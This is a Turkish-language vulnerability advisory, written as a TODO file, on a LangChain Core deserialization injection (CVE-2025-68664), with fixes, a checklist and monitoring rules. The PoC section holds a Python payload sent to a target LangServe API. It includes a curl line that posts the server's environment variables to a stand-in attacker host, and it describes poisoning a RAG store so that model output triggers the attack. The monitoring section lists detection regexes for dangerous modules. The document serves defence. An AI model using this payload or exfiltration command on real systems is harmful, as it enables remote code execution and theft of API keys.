# TODO: CVE-2025-68664 — LangChain Core LangGrinch Serilestirme Enjeksiyonu

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | CVE-2025-68664 |
| **Kritiklik** | Kritik |
| **Kategori Klasoru** | Erisim_Kontrolu/ |
| **Kaynak Arastirma** | [Ocak_2026_Guvenlik_Aciklari_Arastirmasi.md](../Arastirmalar/Ocak_2026_Guvenlik_Aciklari_Arastirmasi.md) |
| **Tarih** | 2026-02-02 |
| **Mevcut Dokuman** | Silindi — icerik bu TODO dosyasinda | |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** CVE-2025-68664 (LangGrinch), AI/LLM ekosisteminin temel kutuphanelerinden olan LangChain Core'daki bir serilestirme enjeksiyonu (deserialization injection) zafiyetidir. CVSS 9.3 ile derecelendirilen bu acik, saldirganların AI model ciktilari veya kullanici girdileri uzerinden kotu amacli serilestirmis nesneler enjekte ederek API anahtarlarini sizdirmasina, sunucu uzerinde uzaktan kod yurutmesine (RCE) veya AI pipeline'ini tamamen ele gecirmesine olanak tanimaktadir. Yapay zeka araclarinin kurumsal sistemlere entegrasyonunun hizla arttigi bir donemde, bu zafiyet AI tedarik zinciri guvenliginin ne kadar kritik oldugunu ortaya koymaktadir. LangChain'i kullanan chatbotlar, RAG (Retrieval-Augmented Generation) sistemleri, AI ajanlar ve otomasyon pipeline'lari dogrudan etkilenmektedir.
*   **Etkilenen bilesenler:** LangChain Core kutuphanesi (langchain-core < 0.3.29), LangChain serilestirme/deserilestirme modulleri (load_chain, loads, dumps), LangChain tabanli RAG uygulamalari, AI ajanlari ve chatbotlar, LangServe ile deploy edilen API servisleri, LangChain'i bagimlilk olarak kullanan tum Python uygulamalari

---

### 2. Teknik detay (nasil calisiyor)
*   LangChain, AI pipeline'larini olusturmak icin zincir (chain), prompt sablonu (prompt template), cikti analizcisi (output parser) gibi bilesenleri serilestirme yoluyla kaydeder ve yukler. Bu serilestirme, JSON tabanli ozel bir format kullanir ve Python sinif isimlerini, modul yollarini ve parametreleri icerir.
*   Zafiyetin kok nedeni, LangChain'in `loads()` fonksiyonunun gelen serilestirmis veriyi cozumlerken, `type` alaninda belirtilen Python sinifini dogrudan import edip orneklemesidir (instantiate). Varsayilan konfigurasyonda, izin verilen sinif listesi (allowlist) yeterince kisitlayici degildir veya tamamen devre disi birakilmistir.
*   Saldirgan, iki temel vektorden yararlanabilir: (1) Dogrudan giris: Kullanici girdisi olarak gelen veri, LangChain serilestirme formatinda yorumlanir ve kotu amacli bir sinif yuklenir. (2) Dolayli giris (Prompt Injection): AI modelinin ciktisi, LangChain pipeline'inda sonraki adimda serilestirmis nesne olarak islenir ve model ciktisi uzerinden enjekte edilen zararli sinif yuklenir.
*   Ornegin, saldirgan `type` alanina `os.system` veya `subprocess.Popen` gibi bir Python sinifi belirterek ve parametrelere bir shell komutu vererek, sunucuda keyfi kod yurutebilir. Alternatif olarak, `__reduce__` metodu tanimliyken Python'un pickle serilestirmesini tetikleyerek daha karmasik payload'lar kullanabilir.
*   **Neden:** Kok neden, LangChain Core'un serilestirme modulunde tip dogrulamasinin (type validation) ve sinif beyaz listesinin (class allowlist) yeterince katı olmamasıdır. "Guvenilmeyen girdi" kavraminın AI model ciktilarini da kapsayacak sekilde genisletilmemesi ve serilestirme sirasinda keyfi Python siniflarinin yuklenmesine izin verilmesi bu zafiyeti dogurmustur.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** LangChain tabanli AI chatbot, RAG sistemi veya LangServe ile deploy edilmis API servisi
*   **2. Normal durum:**
    ```
    1. Kullanici, AI chatbot'a bir soru gonderir
    2. LangChain, soruyu prompt sablonuna yerlestirir ve LLM'e iletir
    3. LLM cevabi doner, LangChain cikti analizcisi ile isler
    4. Sonuc kullaniciya iletilir
    5. Zincir yapilandirmasi guvenli serilestirmis formatta kaydedilir
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```python
    import requests
    import json

    # LangChain serilestirme formati ile kotu amacli nesne
    malicious_chain = {
        "lc": 1,
        "type": "constructor",
        "id": ["langchain", "chains", "llm", "LLMChain"],
        "kwargs": {
            "llm": {
                "lc": 1,
                "type": "constructor",
                "id": ["os", "system"],  # Tehlikeli: os.system calistirma
                "kwargs": {}
            },
            "prompt": {
                "lc": 1,
                "type": "constructor",
                "id": ["subprocess", "Popen"],
                "kwargs": {
                    "args": "curl https://saldirgan.com/exfil -d $(env)",
                    "shell": True
                }
            }
        }
    }

    # LangServe API'sine gonder
    response = requests.post(
        "https://hedef-ai.com/api/chain/invoke",
        json={"input": json.dumps(malicious_chain)},
        headers={"Content-Type": "application/json"}
    )

    # Alternatif: Dolayli enjeksiyon (AI model ciktisi uzerinden)
    # Saldirgan, RAG veritabanina zararli dokuman ekler
    # Dokuman icerigi: {"lc":1,"type":"constructor","id":["os","system"],...}
    # AI modeli bu icerigi ciktisina dahil ettiginde LangChain isleme alir
    ```
*   **4. Analiz:** LangChain'in `loads()` fonksiyonu, gelen JSON verisindeki `id` alanini Python modul yolu olarak yorumlar ve `importlib` ile dinamik olarak yukler. `["os", "system"]` belirtildiginde, Python'un `os.system` fonksiyonu import edilir ve `kwargs` parametreleri ile cagrilir. Bu islemde sinif beyaz listesi kontrolu zayif oldugunda veya devre disi birakildiginda, herhangi bir Python modulu ve fonksiyonu yuklenebilir. Dolayli enjeksiyon senaryosunda, saldirgan RAG veritabanina zararli icerik enjekte eder ve AI modeli bu icerigi islerken serilestirme tetiklenir.
*   **5. Kanit:** Basarili istismar sonucunda sunucu ortam degiskenleri (OPENAI_API_KEY, DATABASE_URL, AWS_SECRET_ACCESS_KEY gibi) saldirganin sunucusuna iletilir. Sunucuda beklenmeyen islem olusturulmasi, dosya yazma veya ag baglantisi gozlemlenir. AI pipeline'i manipule edilebilir: model ciktilari degistirilir, zararli icerik kullanicilara iletilir veya tum AI servisi devre disi birakilir.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Kritik
*   **CVSS Skoru:** 9.3 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L)
*   **Saldiri Yuzeyi:** Internete acik (LangServe API'leri, AI chatbot arayuzleri, RAG sistemleri)
*   **Karmasiklik:** Dusuk (serilestirme formati belgelendirilmis, dolayli enjeksiyon icin RAG veritabanina erisim yeterli)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** LangChain Core'u guvenli surume guncelleyin (`pip install langchain-core>=0.3.29`). Tum LangChain tabanli uygulamalarda kullanilan API anahtarlarini dondurrun (OPENAI_API_KEY, ANTHROPIC_API_KEY, AWS anahtarlari, veritabani sifreleri). Serilestirme fonksiyonlarinda (`loads`, `load_chain`) yalnizca bilinen guvenli siniflara izin veren katı beyaz liste tanimlayin. Dogrudan kullanici girdisinin LangChain serilestirme formatinda islenmesini engelleyin.
*   **Orta vadeli:** RAG veritabanlarindaki icerik butunlugunu dogrulayin ve zararli serilestirme kaliplarini tarayin. AI pipeline'larinda giris ve cikis dogrulama katmanlari ekleyin (model ciktilari dahil). LangChain ve diger AI kutuphanelerini izole sandbox ortamlarinda calistirin (Docker, gVisor). API anahtarlarini ortam degiskenleri yerine secret manager (AWS Secrets Manager, HashiCorp Vault) ile yonetin.
*   **Uzun vadeli:** AI/LLM tedarik zinciri guvenlik politikasi olusturun ve tum AI kutuphanelerini SBOM envanterine dahil edin. Prompt injection ve serilestirme enjeksiyonu testlerini CI/CD pipeline'ina entegre edin. AI model ciktilarinin "guvenilmez girdi" olarak degerlendirilmesini zorunlu kilan gelistirme standartlari belirleyin. LangChain guvenlik bultenleri icin otomatik izleme ve yamala sureci olusturun. Kurumsal AI kullanim politikalari ve "Shadow AI" denetim mekanizmalari kurun.

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```python
# === GUVENSIZ: Serilestirme kontrolu olmadan chain yukleme ===
from langchain.chains import load_chain
from langchain_core.load import loads

# Dogrudan kullanici girdisinden chain yukleme — RCE riski!
def load_user_chain(user_input: str):
    chain = loads(user_input)  # Herhangi bir Python sinifi yuklenebilir!
    return chain.invoke({"query": "Merhaba"})

# Guvenilmeyen kaynaktan chain dosyasi yukleme
chain = load_chain("untrusted_source.json")  # RCE riski!
result = chain.invoke({"input": "soru"})
```

**Guvenli kod:**
```python
# === GUVENLI: Strict beyaz liste + giris dogrulama + sandbox ===
from langchain_core.load import loads
from langchain_core.load.mapping import SERIALIZABLE_MAPPING
import json
import re

# 1. Yalnizca bilinen guvenli siniflara izin ver (strict allowlist)
ALLOWED_CLASSES = frozenset({
    "langchain_core.prompts.ChatPromptTemplate",
    "langchain_core.prompts.PromptTemplate",
    "langchain_core.output_parsers.StrOutputParser",
    "langchain_core.output_parsers.JsonOutputParser",
    "langchain_openai.ChatOpenAI",
    "langchain_anthropic.ChatAnthropic",
})

# 2. Tehlikeli modul kaliplarini tanimla
DANGEROUS_PATTERNS = re.compile(
    r'(os\.|subprocess\.|sys\.|shutil\.|importlib\.|builtins\.|'
    r'eval|exec|compile|__import__|__reduce__|pickle)',
    re.IGNORECASE
)

def safe_deserialize(data: str) -> object:
    """Guvenli LangChain deserializasyon fonksiyonu"""
    # 3. Tehlikeli kaliplari kontrol et
    if DANGEROUS_PATTERNS.search(data):
        raise ValueError("Tehlikeli serilestirme kalibi tespit edildi")

    # 4. JSON yapisini dogrula
    parsed = json.loads(data)
    class_path = _extract_class_path(parsed)

    if class_path not in ALLOWED_CLASSES:
        raise ValueError(f"Izin verilmeyen sinif: {class_path}")

    # 5. Dogrulanmis veri ile yukle
    return loads(data, valid_namespaces=["langchain_core", "langchain_openai"])

def _extract_class_path(obj: dict) -> str:
    """Serilestirmis nesneden sinif yolunu cikar"""
    if "id" in obj and isinstance(obj["id"], list):
        return ".".join(obj["id"])
    return obj.get("type", "unknown")

# 6. API anahtarlarini secret manager ile yonet
# pip install langchain-core>=0.3.29
# API anahtarlarini .env yerine secret manager'dan al:
# from aws_secretsmanager import get_secret
# openai_key = get_secret("prod/openai-api-key")
```

```bash
# LangChain Core'u guvenli surume guncelle
pip install langchain-core>=0.3.29
pip install langchain>=0.3.15

# Mevcut surumu kontrol et
pip show langchain-core | grep Version

# API anahtarlarini dondur
# 1. OpenAI: https://platform.openai.com/api-keys — yeni anahtar olustur, eskisini iptal et
# 2. Anthropic: https://console.anthropic.com/settings/keys
# 3. AWS: aws iam create-access-key && aws iam delete-access-key --access-key-id ESKl_KEY
# 4. Veritabani sifreleri: ALTER USER langchain_user PASSWORD 'yeni_guclu_sifre';

# LangChain bagimliliklarini tara
pip audit  # veya: safety check
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] LangChain kullanan tum uygulamalari ve servisleri envanterle (pip show langchain-core)
*   [ ] Serilestirme noktalarini belirle (loads, load_chain, from_json fonksiyon cagrialri)
*   [ ] LangServe ile deploy edilen API endpoint'lerini tespit et
*   [ ] RAG veritabanlarinin icerik butunlugunu kontrol et
*   [ ] Kullanilan AI API anahtarlarinin listesini cikar (OpenAI, Anthropic, AWS, vb.)

**Duzeltme**
*   [ ] LangChain Core'u guvenli surume guncelle (langchain-core >= 0.3.29)
*   [ ] Serilestirme fonksiyonlarinda strict beyaz liste (allowlist) tanimla
*   [ ] Tum AI API anahtarlarini dondur (OpenAI, Anthropic, AWS, veritabani sifreleri)
*   [ ] Kullanici girdisinin dogrudan serilestirme formatinda islenmesini engelle
*   [ ] RAG veritabanlarindaki icerigi zararli serilestirme kaliplari icin tara
*   [ ] AI pipeline'larini izole sandbox ortamlarinda calistir (Docker, non-root)

**Dogrulama**
*   [ ] Serilestirme enjeksiyonu testini yama sonrasi tekrarla
*   [ ] API anahtari sizdirma senaryolarini test et (dogrudan + dolayli enjeksiyon)
*   [ ] Beyaz liste disindaki siniflarin reddedildigini dogrula
*   [ ] RAG pipeline'inda prompt injection + serilestirme enjeksiyonu zincir testini yap
*   [ ] pip audit ile bagimlilk taramasi calistir

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   LangChain uygulama loglarinda serilestirme hatalari ve reddedilen sinif yukleme girisimlerini izle
    *   AI API cagrilarinda beklenmeyen modul import ve sinif yukleme olaylarini filtrele
    *   Regex: `(?i)(loads\(|load_chain|from_json|deserializ|__reduce__|pickle\.loads)`
    *   Regex: `(?i)(os\.system|subprocess|exec\(|eval\(|__import__|importlib)`
    *   LangServe API loglarinda anormal istek boyutlari ve formatlari izle
*   **Anomali Tespiti:**
    *   AI servisi isleminden beklenmeyen alt islem olusturulmasi (shell, curl, wget)
    *   AI API anahtarlarinin normalden farkli IP adreslerinden kullanilmasi (calinan anahtar belirtisi)
    *   RAG veritabaninda serilestirme formatinda icerik eklenmesi (zararli dokuman enjeksiyonu)
    *   LangChain pipeline'inda beklenmeyen Python modulu import edilmesi
    *   AI servisi kaynak tuketiminde (CPU/bellek) ani ve aciklanamayan artis

---

## Notlar
AI/LLM ekosistemindeki kritik tedarik zinciri riski. Kurumsal AI entegrasyonlarini dogrudan etkiler. LangChain, dunyada en yaygin kullanilan LLM orkestrasyon kutuphanesi oldugundan etki alani cok genis. "Shadow AI" — kontrolsuz AI arac kullanimi — bu tur zafiyetlerin tespit edilmesini zorlastirir. AI model ciktilarinin "guvenilmez girdi" olarak degerlendirilmesi, geleneksel web guvenliginden farkli yeni bir paradigma gerektirmektedir. Prompt injection ve serilestirme enjeksiyonunun birlesimi, AI uygulamalarina ozel yeni bir saldiri sinifi olusturmaktadir.
